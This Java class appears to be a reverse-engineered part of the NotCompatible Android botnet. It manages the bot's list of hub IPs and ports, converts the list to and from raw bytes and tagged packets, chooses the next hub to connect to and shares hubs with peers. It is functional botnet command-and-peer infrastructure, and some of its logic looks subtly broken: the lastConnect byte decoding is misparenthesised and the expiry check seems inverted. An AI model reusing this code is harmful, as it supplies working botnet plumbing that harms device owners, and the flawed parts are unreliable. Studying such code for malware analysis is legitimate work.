package diff.notcompatible.c.bot.objects;

import diff.notcompatible.c.bot.objects.sort.HubListSortConnected;


public class HubList {
	
	public String tag;
	public List list;
	
	public HubList() {
		list = new List();
	}
	
	public HubListItem add() {
		HubListItem item = new HubListItem();
		
		list.add(item);
		
		return item;
	}
	
	public void add(HubListItem item) {
		list.add(item);
	}
	
	public void delete(int index) {
		// TODO: so we don't loose anything we should replicate here to some rolling-file
		delete((HubListItem)list.getObject(index));
	}
	
	public void delete(HubListItem item) {
		list.delete(item);
	}
	
	public void clear() {
		list = new List();
	}
	
	public void clearExpired() {
		long currentTime = System.currentTimeMillis();
		for(int i = 0; i < count(); i++) {
			HubListItem item = getByIndex(i);
			if(!item.used && item.status == -1 && item.lastConnect - 0x65813800L >= currentTime)
				delete(item);
		}
	}
	
	public HubListItem getByIpAndPort(String ip, int port) {
		for(int i = 0; i < count(); i++)
			if(getByIndex(i).ip.equalsIgnoreCase(ip) && getByIndex(i).port == port)
				return getByIndex(i);
		
		return null;
	}
	
	// Was named getCondidatCount ??
	// Likely that since it's looking for unused but status 0 or 1
	// essentially available nodes
	public int getCandidateCount() {
		int candidates = 0;
		
		for(int i = 0; i < count(); i++) {
			if(!getByIndex(i).used)
				if(getByIndex(i).status == 0 || getByIndex(i).status == 1)
					candidates++;
		}
		
		return candidates;
	}
	
	public HubListItem getByIndex(int index) {
		return (HubListItem)list.getObject(index);
	}
	
	public int count() {
		return list.count;
	}

	public void loadFromRaw(byte[] buffer) {
        clear();
        byte[] tmp = new byte[4];
        int count = buffer.length / 10;
        
        for(int i = 0; i < count; i++) {
            HubListItem item = add();
            // Get ip
            System.arraycopy(buffer, i * 10, tmp, 0, 4);
            item.ip = String.valueOf(tmp[0] & 0xFF) + "."
            		+ String.valueOf(tmp[1] & 0xFF) + "."
            		+ String.valueOf(tmp[2] & 0xFF) + "."
            		+ String.valueOf(tmp[3] & 0xFF);
            // Get port
            System.arraycopy(buffer, i * 10 + 4, tmp, 0, 4);
            item.port = ((tmp[0] & 0xFF) << 8) | (tmp[1] & 0xFF);
            System.arraycopy(buffer, i * 10 + 6, tmp, 0, 4);
            // Get last connect
            item.lastConnect = (long) (((((tmp[3] & 0xFF) << 24) |
            		((tmp[2] & 0xFF) << 16)) |
            		((tmp[1] & 0xFF) << 8)) |
            		((tmp[0] & 0xFF) * 1000));
        }
	}
	
    public Packet asPacket() {
    	Packet packet = new Packet();
        packet.tag = tag;
        
        for(int i = 0; i < count(); i++) {
            HubListItem Item = (HubListItem) list.getObject(i);
            Packet itemPacket = packet.add();
            itemPacket.tag = "Item";
            
            Packet ipPacket = itemPacket.add();
            ipPacket.tag = "IP";
            ipPacket.buffer.putIP(Item.ip);
            
            Packet portPacket = itemPacket.add();
            portPacket.tag = "Port";
            portPacket.buffer.putPort(Item.port);
            
            Packet lastConnectPacket = itemPacket.add();
            lastConnectPacket.tag = "LC";
            lastConnectPacket.buffer.putDword((int) (Item.lastConnect / 1000));
        }
        
        return packet;
    }
    
    public byte[] asRaw() {
    	byte[] buffer = new byte[(count() * 10)];
    	byte[] tmpBuffer = new byte[4];
    	
        for(int i = 0; i < count(); i++) {
            HubListItem item = (HubListItem) list.getObject(i);
            
            System.arraycopy(ipToByte(item.ip), 0, buffer, i * 10, 4);
            
            tmpBuffer[0] = (byte) ((item.port & 0xFF00) >> 8);
            tmpBuffer[1] = (byte) (item.port & 0xFF);
            System.arraycopy(tmpBuffer, 0, buffer, i * 10 + 4, 2);

            int lastConnect = (int) (item.lastConnect / 1000);
            tmpBuffer[0] = (byte) (lastConnect & 0xFF);
            tmpBuffer[1] = (byte) ((lastConnect & 0xFF00) >> 8);
            tmpBuffer[2] = (byte) ((lastConnect & 0xFF0000) >> 16);
            tmpBuffer[3] = (byte) ((lastConnect & 0xFF000000) >> 24);
            System.arraycopy(tmpBuffer, 0, buffer, i * 10 + 6, 4);
        }
        
        return buffer;
    }

	public void loadFromPacket(Packet packet) {
        tag = packet.tag;
        
        for(int i = 0; i < packet.getCount(); i++) {
            Packet hublistItemPacket = packet.getByIndex(i);
            if (hublistItemPacket.tag.equals("Item")) {
                Packet ipPacket = hublistItemPacket.getByName("IP");
                Packet portPacket = hublistItemPacket.getByName("Port");
                Packet lastConnectPacket = hublistItemPacket.getByName("LC");
                
                // Only add if packet had values and has not been seen yet
                if (ipPacket != null && portPacket != null && getByIpAndPort(ipPacket.asIP(), portPacket.asPort()) == null) {
                    HubListItem hubListAddition = add();
                    hubListAddition.ip = ipPacket.asIP();
                    hubListAddition.port = portPacket.asPort();
                    if (lastConnectPacket != null) {
                        hubListAddition.lastConnect = ((long) lastConnectPacket.asDWord()) * 1000;
                    }
                }
            }
        }
        list.sort(new HubListSortConnected());
	}
	
    private byte[] ipToByte(String ip) {
        String[] x = ip.split("\\.", 4);
        byte[] bf = new byte[4];
        
        bf[0] = (byte) (Integer.parseInt(x[0]) & 0xFF);
        bf[1] = (byte) (Integer.parseInt(x[1]) & 0xFF);
        bf[2] = (byte) (Integer.parseInt(x[2]) & 0xFF);
        bf[3] = (byte) (Integer.parseInt(x[3]) & 0xFF);
        
        return bf;
    }

	public Packet getHubListFordSend() {
		list.sort(new HubListSortConnected());
		
		int count = 0;
		
		Packet hubListPacket = new Packet();
		hubListPacket.tag = tag;
		
		for(int i = 0; i < list.count; i++) {
			HubListItem item = getByIndex(i);
			if(item.lastConnect > 0 || item.used) {
				Packet itemPacket = hubListPacket.add();
				itemPacket.tag = "Item";
				
				Packet ipPacket = itemPacket.add();
				ipPacket.tag = "IP";
				ipPacket.buffer.putIP(item.ip);
				
				Packet portPacket = itemPacket.add();
				portPacket.tag = "Port";
				portPacket.buffer.putPort(item.port);
				
				if(count == 20)
					break;
				
				count++;
			}
		}
		
		return hubListPacket;
	}

	public HubListItem getNextToConnect() {
		HubListItem item = null;
		long currentTime =  System.currentTimeMillis();
		
		for(int i = 0; i < count(); i++) {
			item = (HubListItem) list.getObject(i);
			if(!item.used && item.status == 0)
				return item;
		}
		
		for(int i = 0; i < count(); i++) {
			item = (HubListItem) list.getObject(i);
			if(!item.used && item.status == -1 && item.lastTested + 600000L <= currentTime && item.connectCount < 10)
				return item;
		}
		
		for(int i = 0; i < count(); i++) {
			item = (HubListItem) list.getObject(i);
			if(!item.used && item.status == 1)
				return item;
		}
		
		return item;
	}
}
